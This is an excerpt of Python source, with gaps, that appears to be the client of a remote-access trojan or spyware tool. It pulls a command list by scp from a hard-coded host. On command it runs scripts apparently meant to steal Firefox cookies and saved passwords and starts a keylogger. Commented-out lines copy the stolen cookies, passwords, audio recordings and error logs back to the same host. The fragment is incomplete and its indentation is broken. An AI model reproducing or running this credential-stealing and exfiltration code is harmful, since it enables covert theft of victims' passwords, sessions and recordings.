...
os.system("scp koala@192.168.63.193:~/comandos.txt /tmp/")
...
for c in comandos:
    if c == "cookies":
       		os.system("python firecookies.py")	
                #os.system('scp /tmp/cookies.txt koala@192.168.63.193:~/keylogger')
                #os.system('rm -f /tmp/cookies.txt')

    elif c == "contrasenas":
       		os.system("python firepass.py")
                #os.system('scp /tmp/firepass.txt koala@192.168.63.193:~/contrasenas')
        	...
        	keylogger.keylog(mo.group(1))
                ...
                #os.system('scp /tmp/*.wav koala@192.168.63.193:~/audio')
...
#os.system('scp /tmp/comandosnovalidos.txt koala@192.168.63.193:~/error 1>/dev/null')
